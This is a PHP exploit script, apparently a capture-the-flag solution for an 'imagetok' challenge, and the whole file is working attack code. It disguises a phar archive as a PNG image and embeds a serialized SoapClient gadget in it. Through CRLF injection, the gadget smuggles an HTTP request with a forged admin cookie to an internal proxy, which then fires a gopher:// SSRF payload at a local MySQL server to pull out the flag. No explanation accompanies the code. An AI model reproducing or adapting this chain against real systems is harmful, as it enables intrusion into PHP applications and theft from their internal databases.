<?php
  /*
  Coded by d4rkstat1c
  */
  class ImageModel {
      public $file;
      public function __construct($file) {
          $this->file = $file;
      }

      public function __destruct()
      {
          $this->file->getFileName();
      }
  }

  $cookie = 'eyJmaWxlcyI6W10sInVzZXJuYW1lIjoiYWRtaW4ifQ%3D%3D.JDJ5JDEwJFgzaUwwWkE5VGdqYnpPbVoueFhQaXVFbGFCWlRHRXplNEZUWlVreE5wRmF1QUtkeXgxQ2Fh;';
  $gopher_payload = '<gopher:///127.0.0.1:3306/_%a9%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%75%73%65%72%5f%65%79%48%42%54%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%8d%00%00%00%03%49%4e%53%45%52%54%20%49%4e%54%4f%20%64%62%5f%57%7a%57%36%4c%2e%66%69%6c%65%73%28%66%69%6c%65%5f%6e%61%6d%65%2c%20%63%68%65%63%6b%73%75%6d%2c%20%75%73%65%72%6e%61%6d%65%29%20%56%41%4c%55%45%53%28%28%53%45%4c%45%43%54%20%66%6c%61%67%20%46%52%4f%4d%20%64%62%5f%57%7a%57%36%4c%2e%64%65%66%69%6e%69%74%65%6c%79%5f%6e%6f%74%5f%61%5f%66%6c%61%67%29%2c%20%e2%80%98%61%62%63%e2%80%99%2c%20%e2%80%98%61%64%6d%69%6e%e2%80%99%29%3b%01%00%00%00%01';
  $post_data = 'url=' . urlencode($gopher_payload);

  $localhost = 'http://127.0.0.1';
  $CRLF = "\r\n";
  $crlf_init_str = $CRLF . 
      'Content-Length: 0' .
      str_repeat($CRLF, 2);

  $smug_headers = [
      'POST /proxy HTTP/1.1',
      'Host: admin.imagetok.htb',
      'Connection: Close',
      'Content-Type: application/x-www-form-urlencoded',
      'Cookie: PHPSESSID=' . $cookie,
      'Content-Length: ' . (string)strlen($post_data)
      ];

  $smug_headers_str = join($CRLF, $smug_headers) .
      str_repeat($CRLF, 2);

  $crlf_payload =
       $crlf_init_str .
       $smug_headers_str .
       $post_data;

  $ssrf_object = new ImageModel(new SoapClient(null, array(
          'uri' => 'bbb',
          'location' => $localhost,
          'user_agent' => 'xxx' . $crlf_payload,
      )));

  $png_data = fread(fopen('image.png', 'rb'), filesize('image.png'));
  $phar = new Phar('exploit.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', 'test');
  $phar->setStub($png_data . ' __HALT_COMPILER(); ? >');
  $phar->setMetadata($ssrf_object);
  $phar->stopBuffering();
  rename('exploit.phar', 'exploit.png');

  echo serialize($ssrf_object) . "\n";
?>